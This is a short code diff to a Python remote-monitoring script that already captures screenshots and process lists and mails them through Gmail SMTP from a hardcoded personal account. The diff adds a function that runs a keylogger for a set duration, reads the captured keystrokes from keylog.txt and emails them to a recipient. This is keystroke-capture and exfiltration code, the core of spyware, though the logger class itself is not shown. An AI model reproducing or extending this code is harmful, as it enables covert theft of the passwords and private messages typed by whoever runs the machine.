@@ -5,6 +5,7 @@ from email.mime.image import MIMEImage
 from PIL import ImageGrab  # Import ImageGrab for local screenshot capture
 from appController import AppController  # Import the AppController class
 from processController import ProcessController
+from keyLog import keyLog
 
 SMTP_HOST = 'smtp.gmail.com'
 SMTP_USER = 'tnmhoang.lop93@gmail.com'
@@ -63,3 +64,12 @@ def send_bgProcess_email(recipient_email):
     body = formatted_table  # Use formatted table as the email body
 
     send_email(subject, body, recipient_email)
+
+def send_keyLog_email(recipient_email, duration):
+    key_log = keyLog()
+    key_log.clearFile("keylog.txt")
+    key_log.run_keyLog(duration)
+    subject = "KEY LOG"
+    body = key_log.read_file("keylog.txt")
+    if body is not None:
+        send_email(subject, body, recipient_email)
